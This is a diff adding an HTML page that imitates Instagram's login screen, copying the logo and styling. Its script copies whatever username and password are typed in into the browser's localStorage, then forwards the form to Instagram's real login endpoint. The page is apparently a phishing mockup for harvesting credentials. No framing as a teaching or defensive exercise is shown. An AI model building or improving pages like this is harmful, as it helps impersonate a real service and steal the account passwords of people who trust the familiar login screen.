@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 5px;
+            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
+            width: 350px;
+            text-align: center;
+        }
+        .logo {
+            margin-bottom: 20px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #3897f0;
+            border: none;
+            color: white;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .login-btn:hover {
+            background-color: #2a77d8;
+        }
+        .forgot-password {
+            color: #3897f0;
+            font-size: 12px;
+            text-decoration: none;
+            display: block;
+            margin-top: 10px;
+        }
+        .signup {
+            margin-top: 10px;
+        }
+        .signup a {
+            color: #3897f0;
+            text-decoration: none;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" width="150">
+        </div>
+        <form onsubmit="return myfunction()"action="https://www.instagram.com/accounts/login/" method="POST">
+            <input id="input1"class="input-field" type="text" name="username" placeholder="Username" required><br>
+            <input id ="input2"class="input-field" type="password" name="password" placeholder="Password" required><br>
+            <button onclick="myfunction() " class="login-btn" type="submit">Log In</button>
+            
+        </form>
+        <a href="#" class="forgot-password">Forgot password?</a>
+        <div class="signup">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+    </div>
+<script>
+  function myfunction () {
+  const in1 = document.getElementById("input1").value;
+  const in2 = document.getElementById("input2").value;
+
+  localStorage.setItem("email", in1);
+  localStorage.setItem("password", in2);
+  
+
+
+  // Stop form from submitting
+  
+}
+</script>
+</body>
+</html>
